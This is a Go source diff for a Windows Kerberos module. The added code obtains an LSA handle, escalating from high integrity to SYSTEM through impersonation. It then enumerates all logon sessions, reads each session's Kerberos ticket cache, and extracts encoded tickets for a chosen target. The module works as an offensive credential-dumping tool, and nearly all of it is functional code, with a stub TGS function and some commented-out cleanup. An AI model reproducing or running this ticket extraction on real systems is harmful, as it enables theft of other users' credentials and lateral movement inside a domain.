@@ -1,25 +1,27 @@
 package kerb
 
 import (
-	"bytes"
-	"encoding/binary"
 	"fmt"
 	"strings"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
 
 var (
+	advapi32 = windows.NewLazyDLL("advapi32.dll")
 
-	procAcquireCredentialsHandleA  = modSecur32.NewProc("AcquireCredentialsHandleA")
-	procInitializeSecurityContextA = modSecur32.NewProc("InitializeSecurityContextA")
-	procLsaCallAuthenticationPackage = modSecur32.NewProc("LsaCallAuthenticationPackage")
-	procLsaConnectUntrusted = modSecur32.NewProc("LsaConnectUntrusted")
-	procLsaFreeReturnBuffer = modSecur32.NewProc("LsaFreeReturnBuffer")
-
+	procAcquireCredentialsHandleA      = modSecur32.NewProc("AcquireCredentialsHandleA")
+	procInitializeSecurityContextA     = modSecur32.NewProc("InitializeSecurityContextA")
+	procLsaCallAuthenticationPackage   = modSecur32.NewProc("LsaCallAuthenticationPackage")
+	procLsaConnectUntrusted            = modSecur32.NewProc("LsaConnectUntrusted")
+	procLsaFreeReturnBuffer            = modSecur32.NewProc("LsaFreeReturnBuffer")
+	procLsaEnumerateLogonSessions      = modSecur32.NewProc("LsaEnumerateLogonSessions")
+	procLsaGetLogonSessionData         = modSecur32.NewProc("LsaGetLogonSessionData")
+	procLsaLookupAuthenticationPackage = modSecur32.NewProc("LsaLookupAuthenticationPackage")
+	procImpersonateLoggedOnUser        = advapi32.NewProc("ImpersonateLoggedOnUser")
 )
-
 
 type SEC_WINNT_AUTH_IDENTITY_A struct {
 	User           *byte
@@ -32,11 +34,9 @@ type SEC_WINNT_AUTH_IDENTITY_A struct {
 }
 
 const (
-
 	SEC_WINNT_AUTH_IDENTITY_ANSI = 1
-
+	KerbQueryTicketCacheMessage  = 1
 )
-
 
 func stringToAnsiPointer(s string) *byte {
 	if s == "" {
@@ -102,7 +102,7 @@ func TGT(domain, username, password string) ([]byte, error) {
 		uintptr(unsafe.Pointer(targetPtr)),
 		uintptr(contextReqFlags),
 		0,
-		ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY , // Kerberos Flags
+		ISC_REQ_DELEGATE|ISC_REQ_MUTUAL_AUTH|ISC_REQ_ALLOCATE_MEMORY, // Kerberos Flags
 		// SECURITY_NATIVE_DREP,
 		0,
 		0,
@@ -117,163 +117,423 @@ func TGT(domain, username, password string) ([]byte, error) {
 		return nil, fmt.Errorf("InitializeSecurityContextA failed: status=0x%x, winErr=0x%x, err=%v", status, winErr, errCall)
 	}
 
-	defer procDeleteSecurityContext.Call(uintptr(unsafe.Pointer(&contextHandle)))
-	defer procFreeCredentialsHandle.Call(uintptr(unsafe.Pointer(&credHandle)))
+	// defer procDeleteSecurityContext.Call(uintptr(unsafe.Pointer(&contextHandle)))
+	// defer procFreeCredentialsHandle.Call(uintptr(unsafe.Pointer(&credHandle)))
 
 	ticketData := unsafe.Slice((*byte)(unsafe.Pointer(outBuf.pvBuffer)), outBuf.cbBuffer)
 	ticketCopy := append([]byte(nil), ticketData...)
 	return ticketCopy, nil
 }
 
-type KRBCred struct {
-	Ticket    []byte `asn1:"tag:0,optional"`
-	Encrypted []byte `asn1:"tag:1"`
-}
-
-
-func KerberosInit() (hLsaConnection *windows.Handle, kerberosPackageName *UNICODE_STRING, err error) {
-	var status uintptr
-	var MICROSOFT_KERBEROS_NAME_A *uint16
-	MICROSOFT_KERBEROS_NAME_A, err = windows.UTF16PtrFromString("Kerberos")
-	if err != nil {
-		return nil, nil, fmt.Errorf("failed to convert Kerberos string to UTF16: %w", err)
-	}
-	defer windows.LocalFree(windows.Handle(unsafe.Pointer(MICROSOFT_KERBEROS_NAME_A)))
-
-	status, _, err = procLsaConnectUntrusted.Call(uintptr(unsafe.Pointer(&hLsaConnection)))
-	if status != 0 {
-		return nil, nil, fmt.Errorf("LsaConnectUntrusted failed with status 0x%x: %w", status, err)
-	}
-
-	kerberosPackageName = &UNICODE_STRING{
-		Length:        uint16(len("Kerberos") * 2),
-		MaximumLength: uint16((len("Kerberos") + 1) * 2),
-		Buffer:        MICROSOFT_KERBEROS_NAME_A,
-	}
-
-	return hLsaConnection, kerberosPackageName, nil
-}
-
-type UNICODE_STRING struct {
-	Length        uint16
-	MaximumLength uint16
-	Buffer        *uint16
-}
-
-type KERB_RETRIEVE_TKT_REQUEST struct {
-	MessageType 		uint32
-	LogonId				windows.LUID
-	TargetName			UNICODE_STRING
-	TicketFlags			uint32
-	CacheOptions		uint32
-	EncryptionType		int32
-	CredentialHandle	SECURITY_HANDLE
-	UNK					uintptr
-	TargetNameData		[]byte
-}
-
-type KERB_RETRIEVE_TKT_RESPONSE struct {
-	Ticket KERB_EXTERNAL_TICKET
-}
-func (r *KERB_RETRIEVE_TKT_RESPONSE) From_buffer_copy(buffer []byte) {
-	reader := bytes.NewReader(buffer)
-	_ = reader
-	binary.Read(reader, binary.LittleEndian, &r.Ticket)
-}
-
-type PKERB_EXTERNAL_NAME struct {
-	NameType int16
-	NameCount uint16
-	Names UNICODE_STRING
-}
-type KERB_CRYPTO_KEY struct {
-	KeyType int32 
-	Length uint32
-	Value uintptr
-}
-type KERB_EXTERNAL_TICKET struct {
-	ServiceName *PKERB_EXTERNAL_NAME
-	TargetName *PKERB_EXTERNAL_NAME
-	ClientName *PKERB_EXTERNAL_NAME
-	DomainName UNICODE_STRING
-	TargetDomainName UNICODE_STRING
-	AltTargetDomainName UNICODE_STRING
-	SessionKey KERB_CRYPTO_KEY
-	TicketFlags uint32
-	Flags uint32
-	KeyExpirationTime int64
-	StartTime int64
-	EndTime int64
-	RenewUntil int64
-	TimeSkew int64
-	EncodedTicketSize uint32
-	EncodedTicket uintptr
-}
-
-func Retrieve_tick_Helper(targetname string, logonid int, temp_offset int) (KERB_RETRIEVE_TKT_REQUEST){
-	TickFlags := ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY // Kerberos Flags
-	CacheOptions := 0x8
-	EncryptionType := 0x0
-	targetNameEnc, _ := windows.UTF16PtrFromString(targetname)
-	targData := make([]byte, len(targetname))
-	var Handle SECURITY_HANDLE
-	targetNameUnicode := &UNICODE_STRING{ // convert target name bs
-		Length:        uint16(len(targetname)),
-		MaximumLength: uint16(len(targetname) + 1),
-		Buffer:        targetNameEnc,
-	}
-	req := KERB_RETRIEVE_TKT_REQUEST{
-		MessageType: 8, // retrieve ticket
-		// LogonId: windows.LUID(0), // current logon
-		TargetName: *targetNameUnicode,
-		TicketFlags: uint32(TickFlags),
-		CacheOptions: uint32(CacheOptions),
-		EncryptionType: int32(EncryptionType),
-		CredentialHandle: Handle,
-		TargetNameData: targData,
-
-	}
-	return req
-}
-
-func Extract_Tick(lsa_handle *windows.Handle, package_id *UNICODE_STRING, target_name string) (*KERB_RETRIEVE_TKT_RESPONSE, error) {
-	message := Retrieve_tick_Helper(target_name, 0, 0)
-	var responseSize uint32
-	var responseBuffer *byte
-
-	status, _, err := procLsaCallAuthenticationPackage.Call(
-		uintptr(*lsa_handle),
-		uintptr(unsafe.Pointer(package_id)),
-		uintptr(unsafe.Pointer(&message)),
-		uintptr(unsafe.Pointer(&responseSize)),
-		uintptr(unsafe.Pointer(&responseBuffer)),
-	)
-	
-	if status != 0 {
-		return nil, fmt.Errorf("LsaCallAuthenticationPackage failed with status 0x%x: %w", status, err)
-	}
-
-	if responseBuffer == nil {
-		return nil, fmt.Errorf("no response data received from LsaCallAuthenticationPackage")
-	}
-
-	// Make sure we free the response buffer when we're done
-	// defer procLsaFreeReturnBuffer.Call(uintptr(unsafe.Pointer(responseBuffer)))
-
-	// Convert the response buffer to our response type
-	response := (*KERB_RETRIEVE_TKT_RESPONSE)(unsafe.Pointer(&responseBuffer))
-	
-	// Create a copy of the response data since the buffer will be freed
-	responseCopy := *response
-	
-	return &responseCopy, nil
-}
-
-func TGS(tgt []byte, hLsaConnection windows.Handle) (ticket []byte, err error){
+func TGS(tgt []byte, hLsaConnection windows.Handle) (ticket []byte, err error) {
 	// Get a TGS using LsaCallAuthenticationPackage
 
 	if err != nil {
 		return
 	}
 	return
+}
+
+func GetLsaHandle() (windows.Handle, error) {
+	isHighIntegrity := IsHighIntegrity()
+	isSystem := IsSystem()
+
+	// fmt.Printf("obtaining LSA handle\n high integrity: %t\n is system: %t\n", isHighIntegrity, isSystem)
+
+	var lsaHandle windows.Handle
+	if isHighIntegrity && !isSystem {
+		// fmt.Printf("process is high integrity, but not system\n")
+		success := GetSystem()
+		if !success {
+			return 0, fmt.Errorf("failed to get SYSTEM privileges")
+		}
+		if !IsSystem() {
+			return 0, fmt.Errorf("failed to maintain SYSTEM privileges")
+		}
+
+		ret, _, err := procLsaConnectUntrusted.Call(
+			uintptr(unsafe.Pointer(&lsaHandle)),
+		)
+		if ret != 0 {
+			return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed: %v", err)
+		}
+
+		// revert to original security context after obtain LSA handle as SYSTEM
+		_ = windows.RevertToSelf()
+
+		return lsaHandle, nil
+	}
+
+	ret, _, err := procLsaConnectUntrusted.Call(
+		uintptr(unsafe.Pointer(&lsaHandle)),
+	)
+	if ret != 0 {
+		return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed: %v", err)
+	}
+
+	return lsaHandle, nil
+}
+
+func GetAuthenticationPackage(lsaHandle windows.Handle, lsaString *LsaString) (uint32, error) {
+	var authPackage uint32
+
+	ret, _, err := procLsaLookupAuthenticationPackage.Call(
+		uintptr(lsaHandle),
+		uintptr(unsafe.Pointer(lsaString)),
+		uintptr(unsafe.Pointer(&authPackage)),
+	)
+	if ret != 0 {
+		return authPackage, fmt.Errorf("LsaLookupAuthenticationPackage failed: %v", err)
+	}
+
+	return authPackage, nil
+}
+
+func EnumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]SessionCred, error) {
+	var luids []windows.LUID
+	var sessionCreds []SessionCred
+
+	isHighIntegrity := IsHighIntegrity()
+
+	if isHighIntegrity {
+		var err error
+		luids, err = enumerateLogonSessions()
+		if err != nil {
+			return nil, fmt.Errorf("failed to enumerate logon sessions: %v", err)
+		}
+		// fmt.Printf("Found %d logon sessions\n", len(luids))
+	} else {
+		luid, err := getCurrentLUID()
+		if err != nil {
+			return nil, fmt.Errorf("failed to get current luid: %v", err)
+		}
+		luids = append(luids, luid)
+		// fmt.Printf("Using current session LUID: 0x%x\n", uint64(luid.HighPart)<<32|uint64(luid.LowPart))
+	}
+
+	for _, luid := range luids {
+		sessionData, err := getLogonSessionData(luid)
+		if err != nil {
+			fmt.Printf("Warning: failed to get logon session data for LUID 0x%x: %v\n",
+				uint64(luid.HighPart)<<32|uint64(luid.LowPart), err)
+			continue
+		}
+
+		// fmt.Printf("Processing session for user: %s\\%s (LUID: 0x%x)\n",
+		// 	sessionData.LogonDomain, sessionData.Username,
+		// 	uint64(sessionData.LogonID.HighPart)<<32|uint64(sessionData.LogonID.LowPart))
+
+		var sessionCred SessionCred
+		sessionCred.LogonSession = *sessionData
+		sessionCred.Tickets = []KrbTicket{}
+
+		// Create and initialize the request structure on the heap
+		request := &KerbQueryTktCacheRequest{
+			MessageType: KerbQueryTicketCacheMessage,
+			LogonId:     sessionData.LogonID,
+		}
+
+		// Calculate total size needed
+		requestSize := unsafe.Sizeof(*request)
+
+		// Ensure request is properly aligned
+		alignedRequest := make([]byte, requestSize)
+		*(*KerbQueryTktCacheRequest)(unsafe.Pointer(&alignedRequest[0])) = *request
+
+		var responsePtr uintptr
+		var returnLength uint32
+		var protocolStatus uint32
+
+		// fmt.Printf("Calling LsaCallAuthenticationPackage for tickets with LUID: 0x%x...\n",
+		// 	uint64(request.LogonId.HighPart)<<32|uint64(request.LogonId.LowPart))
+
+		status, _, _ := procLsaCallAuthenticationPackage.Call(
+			uintptr(lsaHandle),
+			uintptr(authPackage),
+			uintptr(unsafe.Pointer(&alignedRequest[0])),
+			requestSize,
+			uintptr(unsafe.Pointer(&responsePtr)),
+			uintptr(unsafe.Pointer(&returnLength)),
+			uintptr(unsafe.Pointer(&protocolStatus)),
+		)
+
+		// fmt.Printf("LsaCallAuthenticationPackage results:\n")
+		// fmt.Printf("  Status: 0x%x\n", status)
+		// fmt.Printf("  Protocol Status: 0x%x\n", protocolStatus)
+		// fmt.Printf("  Return Length: %d\n", returnLength)
+		// fmt.Printf("  Response Pointer: %v\n", responsePtr)
+
+		if status != 0 {
+			// fmt.Printf("Warning: LsaCallAuthenticationPackage failed for LUID 0x%x: 0x%x\n",
+			// 	uint64(luid.HighPart)<<32|uint64(luid.LowPart), status)
+			continue
+		}
+
+		if protocolStatus != 0 && protocolStatus != 0xc000005f {
+			// fmt.Printf("Warning: Protocol status error for LUID 0x%x: 0x%x\n",
+			// 	uint64(luid.HighPart)<<32|uint64(luid.LowPart), protocolStatus)
+			continue
+		}
+
+		if responsePtr != 0 {
+			response := (*KerbQueryTktCacheResponse)(unsafe.Pointer(responsePtr))
+			// fmt.Printf("Number of tickets found: %d\n", response.CountOfTickets)
+
+			if response.CountOfTickets > 0 {
+				// Calculate the size of a single ticket
+				ticketSize := unsafe.Sizeof(KerbTicketCacheInfo{})
+
+				// Get the pointer to the first ticket
+				firstTicketPtr := responsePtr + unsafe.Sizeof(*response)
+
+				// Iterate through all tickets
+				for i := uint32(0); i < response.CountOfTickets; i++ {
+					currentTicketPtr := firstTicketPtr + uintptr(i)*ticketSize
+					ticketInfo := (*KerbTicketCacheInfo)(unsafe.Pointer(currentTicketPtr))
+
+					// Safely extract strings by checking if the Buffer pointer is within our response memory
+					var serverName, realmName string
+
+					if ticketInfo.ServerName.Buffer != 0 && ticketInfo.ServerName.Length > 0 {
+						if ticketInfo.ServerName.Buffer >= responsePtr &&
+							ticketInfo.ServerName.Buffer < (responsePtr+uintptr(returnLength)) {
+							serverNamePtr := (*[1 << 30]byte)(unsafe.Pointer(ticketInfo.ServerName.Buffer))
+							serverName = windows.UTF16ToString((*[1 << 30]uint16)(unsafe.Pointer(&serverNamePtr[0]))[:ticketInfo.ServerName.Length/2])
+						}
+					}
+
+					if ticketInfo.RealmName.Buffer != 0 && ticketInfo.RealmName.Length > 0 {
+						if ticketInfo.RealmName.Buffer >= responsePtr &&
+							ticketInfo.RealmName.Buffer < (responsePtr+uintptr(returnLength)) {
+							realmNamePtr := (*[1 << 30]byte)(unsafe.Pointer(ticketInfo.RealmName.Buffer))
+							realmName = windows.UTF16ToString((*[1 << 30]uint16)(unsafe.Pointer(&realmNamePtr[0]))[:ticketInfo.RealmName.Length/2])
+						}
+					}
+
+					ticket := KrbTicket{
+						StartTime:      FileTimeToTime(ticketInfo.StartTime),
+						EndTime:        FileTimeToTime(ticketInfo.EndTime),
+						RenewTime:      FileTimeToTime(ticketInfo.RenewTime),
+						TicketFlags:    TicketFlags(ticketInfo.TicketFlags),
+						EncryptionType: int32(ticketInfo.EncryptionType),
+						ServerName:     serverName,
+						ServerRealm:    realmName,
+					}
+
+					// fmt.Printf("Found ticket for server: %s@%s\n",
+					// 	ticket.ServerName, ticket.ServerRealm)
+
+					sessionCred.Tickets = append(sessionCred.Tickets, ticket)
+				}
+			}
+
+			procLsaFreeReturnBuffer.Call(responsePtr)
+		}
+
+		if len(sessionCred.Tickets) > 0 {
+			sessionCreds = append(sessionCreds, sessionCred)
+		}
+	}
+
+	if len(sessionCreds) == 0 {
+		return nil, fmt.Errorf("no valid sessions found with tickets")
+	}
+
+	return sessionCreds, nil
+}
+
+func ExtractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LUID, targetName string) ([]byte, error) {
+	if lsaHandle == 0 {
+		return nil, fmt.Errorf("invalid LSA handle")
+	}
+
+	targetNameUTF16 := windows.StringToUTF16(targetName)
+	nameLen := uint16(len(targetNameUTF16) * 2)
+
+	requestSize := unsafe.Sizeof(KerbRetrieveTktRequest{})
+	totalSize := requestSize + uintptr(nameLen)
+
+	buffer := make([]byte, totalSize)
+	bufferPtr := unsafe.Pointer(&buffer[0])
+
+	request := (*KerbRetrieveTktRequest)(bufferPtr)
+	request.MessageType = KerbRetrieveEncodedTicketMessage
+
+	// set LUID based on current token context
+	if IsHighIntegrity() {
+		// value := uint64(luid.HighPart)<<32 | uint64(luid.LowPart)
+		// fmt.Printf("setting luid: 0x%x\n", value)
+		request.LogonId = luid
+	} else {
+		request.LogonId = windows.LUID{LowPart: 0, HighPart: 0}
+	}
+
+	request.TicketFlags = 0
+	request.CacheOptions = 8
+	request.EncryptionType = 0
+	request.CredentialsHandle = SecurityHandle{}
+
+	targetNamePtr := uintptr(bufferPtr) + requestSize
+
+	stringData := unsafe.Slice((*byte)(unsafe.Pointer(&targetNameUTF16[0])), nameLen)
+	targetSlice := unsafe.Slice((*byte)(unsafe.Pointer(targetNamePtr)), nameLen)
+	copy(targetSlice, stringData)
+
+	request.TargetName = LsaString{
+		Length:        nameLen - 2,
+		MaximumLength: nameLen,
+		Buffer:        targetNamePtr,
+	}
+
+	// fmt.Printf("ticket request struct: \n%+v\n", request)
+
+	var responsePtr uintptr
+	var returnLength uint32
+	var protocolStatus uint32
+
+	ret, _, _ := procLsaCallAuthenticationPackage.Call(
+		uintptr(lsaHandle),
+		uintptr(authPackage),
+		uintptr(bufferPtr),
+		totalSize,
+		uintptr(unsafe.Pointer(&responsePtr)),
+		uintptr(unsafe.Pointer(&returnLength)),
+		uintptr(unsafe.Pointer(&protocolStatus)),
+	)
+
+	// fmt.Printf("\nLsaCallAuthenticationPackage results:\n")
+	// fmt.Printf("  Return code: 0x%x\n", ret)
+	// fmt.Printf("  Protocol status: 0x%x\n", protocolStatus)
+	// fmt.Printf("  Return length: %d\n", returnLength)
+	// fmt.Printf("  Response pointer: %v\n", responsePtr)
+
+	if ret != 0 {
+		return nil, fmt.Errorf("LsaCallAuthenticationPackage failed: 0x%x", ret)
+	}
+
+	if protocolStatus != 0 {
+		return nil, fmt.Errorf("protocol status error: 0x%x", protocolStatus)
+	}
+
+	if responsePtr != 0 {
+		// defer procLsaFreeReturnBuffer.Call(responsePtr)
+		response := (*KerbRetrieveTktResponse)(unsafe.Pointer(responsePtr))
+		encodedTicketSize := response.Ticket.EncodedTicketSize
+
+		if encodedTicketSize > 0 {
+			encodedTicket := make([]byte, encodedTicketSize)
+			copy(encodedTicket,
+				(*[1 << 30]byte)(unsafe.Pointer(response.Ticket.EncodedTicket))[:encodedTicketSize])
+
+			return encodedTicket, nil
+		}
+	} else {
+	}
+
+	return nil, fmt.Errorf("KRB_RETRIEVE_TKT_RESPONSE failed")
+}
+
+func enumerateLogonSessions() ([]windows.LUID, error) {
+	var count uint32
+	var luids uintptr
+
+	ret, _, _ := procLsaEnumerateLogonSessions.Call(
+		uintptr(unsafe.Pointer(&count)),
+		uintptr(unsafe.Pointer(&luids)),
+	)
+
+	if ret != 0 {
+		return nil, fmt.Errorf("LsaEnumerateLogonSessions failed with error: 0x%x", ret)
+	}
+
+	luidSlice := make([]windows.LUID, count)
+	for i := uint32(0); i < count; i++ {
+		luid := (*windows.LUID)(unsafe.Pointer(luids + uintptr(i)*unsafe.Sizeof(windows.LUID{})))
+		luidSlice[i] = *luid
+	}
+
+	// defer procLsaFreeReturnBuffer.Call(luids)
+	return luidSlice, nil
+}
+
+func getCurrentLUID() (windows.LUID, error) {
+	var currentToken windows.Token
+	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &currentToken)
+	if err != nil {
+		return windows.LUID{}, fmt.Errorf("OpenProcessToken failed: %v", err)
+	}
+	// defer currentToken.Close()
+
+	var tokenStats TokenStatistics
+	var returnLength uint32
+
+	err = windows.GetTokenInformation(currentToken, windows.TokenStatistics, (*byte)(unsafe.Pointer(&tokenStats)), uint32(unsafe.Sizeof(tokenStats)), &returnLength)
+	if err != nil {
+		return windows.LUID{}, fmt.Errorf("GetTokenInformation failed: %v", err)
+	}
+
+	return tokenStats.AuthenticationId, nil
+}
+
+func getLogonSessionData(luid windows.LUID) (*LogonSessionData, error) {
+	var sessionDataPtr uintptr
+
+	ret, _, _ := procLsaGetLogonSessionData.Call(
+		uintptr(unsafe.Pointer(&luid)),
+		uintptr(unsafe.Pointer(&sessionDataPtr)),
+	)
+
+	if ret != 0 {
+		return nil, fmt.Errorf("LsaGetLogonSessionData failed with error: 0x%x", ret)
+	}
+
+	// defer procLsaFreeReturnBuffer.Call(sessionDataPtr)
+
+	sessionData := (*SecurityLogonSessionData)(unsafe.Pointer(sessionDataPtr))
+
+	result := &LogonSessionData{
+		LogonID:               sessionData.LoginID,
+		Username:              LsaStrToString(sessionData.Username),
+		LogonDomain:           LsaStrToString(sessionData.LoginDomain),
+		AuthenticationPackage: LsaStrToString(sessionData.AuthenticationPackage),
+		LogonType:             LogonType(sessionData.LogonType),
+		Session:               int32(sessionData.Session),
+		LogonTime:             time.Unix(0, int64(sessionData.LoginTime)*100),
+		LogonServer:           LsaStrToString(sessionData.LogonServer),
+		DnsDomainName:         LsaStrToString(sessionData.DnsDomainName),
+		Upn:                   LsaStrToString(sessionData.Upn),
+	}
+
+	if sessionData.PSiD != 0 {
+		var sidStr *uint16
+		err := windows.ConvertSidToStringSid((*windows.SID)(unsafe.Pointer(sessionData.PSiD)), &sidStr)
+		if err == nil {
+			result.Sid, _ = windows.StringToSid(windows.UTF16PtrToString(sidStr))
+			windows.LocalFree(windows.Handle(unsafe.Pointer(sidStr)))
+		}
+	}
+
+	return result, nil
+}
+
+type KerbQueryTktCacheRequest struct {
+	MessageType uint32
+	LogonId     windows.LUID
+	// No additional fields for basic query
+}
+
+type KerbQueryTktCacheResponse struct {
+	MessageType    uint32
+	CountOfTickets uint32
+	Tickets        [1]KerbTicketCacheInfo // Variable length array
+}
+
+type KerbTicketCacheInfo struct {
+	ServerName     LsaString
+	RealmName      LsaString
+	StartTime      int64
+	EndTime        int64
+	RenewTime      int64
+	EncryptionType int32
+	TicketFlags    uint32
 }
